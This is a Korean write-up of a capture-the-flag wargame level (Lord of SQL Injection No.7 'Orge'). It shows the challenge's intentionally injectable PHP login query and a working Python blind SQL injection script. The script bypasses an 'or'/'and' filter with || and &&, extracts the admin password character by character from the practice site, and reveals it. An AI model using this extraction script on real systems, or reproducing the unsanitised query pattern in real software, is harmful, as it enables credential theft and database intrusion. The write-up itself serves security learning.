# Lord of SQL Injection No.7 Orge

Orge 문제는 `or`, `and`를 우회하여 `Blind SQL Injection`을 하도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

```php
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");
```

이전 문제인 `Darkelf` 문제와 같이 `preg_match` 함수에서 `or`, `and`를 찾으면 `HeHe`를 출력하고 문제 풀이에 실패하게 된다.

`No.4 orc` 문제의 소스 코드와 비교하면 위의 코드만 추가되고 모두 같은 형식임을 알 수 있다.

#### los no.4 orc 되짚어보기
* [los_writeup - No.4 orc](https://github.com/JaehunYoon/Lord_of_SQL_Injection_Writeup/blob/master/los_no4_orc.md)

#### 문제 풀이 조건
`or`, `and`를 사용하지 않으면서 `$_result`의 `pw`값과 `$_GET` 방식으로 입력받은 `pw`가 일치하면 문제 풀이에 성공한다.

## Solution

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = ""
pwlen = 0

for i in range(1,10):
    url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
    add_url = "' || length(pw)={} -- ;".format(i)
    print("Searching Password Length.. [{}]".format(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
    response = urllib.request.urlopen(re)

    if str(response.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found length!! => {}".format(pwlen))
        break

for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
        add_url = "' || id='admin' && substr(pw,1,{})='{}' -- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")

        response = urllib.request.urlopen(re)

        if str(response.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```

(no.4에서 사용했던 python 코드는 `urllib.request.urlopen`에 사용한 변수를 `req`라고 지정했었다. 현재 코드부터는 `req`를 `response`로 바꾸었다.)

```python
for i in range(1,10):
...
```
위의 첫 `for`문에서 DB에 있는 `pw`값의 길이를 찾는다.
`no.4 orc` 에서는 일일이 `length` 함수를 URL에 직접 대입해가며 찾아갔는데, 이 후에는 문제의 `pw` 길이가 항상 8이 아닐 수도 있다는 가정하에 코드를 통해 `pw` 길이를 찾도록 구현하였다.

`"length(pw)={}".format(i)` 를 통해 `pw` 길이가 일치하면 `Hello admin`을 출력하기 때문에 이를 `find` 함수로 찾게 되면 `pwlen`에 그 값을 저장하여 다음 `for`문을 진행하도록 하였다.

`for`문이 진행되면 `pwlen`에는 8이 들어가게 된다.
즉, 우리가 찾아야 할 `pw`의 길이는 8이라는 것을 알 수 있다.

`pw`의 길이를 찾고 난 후에는 `pw` 값을 찾기 위한 이중 `for`문이 실행된다.
코드는 `no.4 orc`와 유사하며 `add_url`에 삽입된 부분에 `or`와 `and`를 사용하던 부분을 `no.6 darkelf` 문제와 같이 `||`와 `&&`로 대체하여 `for`문을 진행하면 `pw` 값을 찾게 된다.

```
http://los.eagle-jump.org/orge_***.php?pw=6c864dec
```
pw=6c864dec 를 URL에 대입하면 `$_result`의 `pw` 값과 일치하기 때문에 문제 풀이에 성공하게 된다.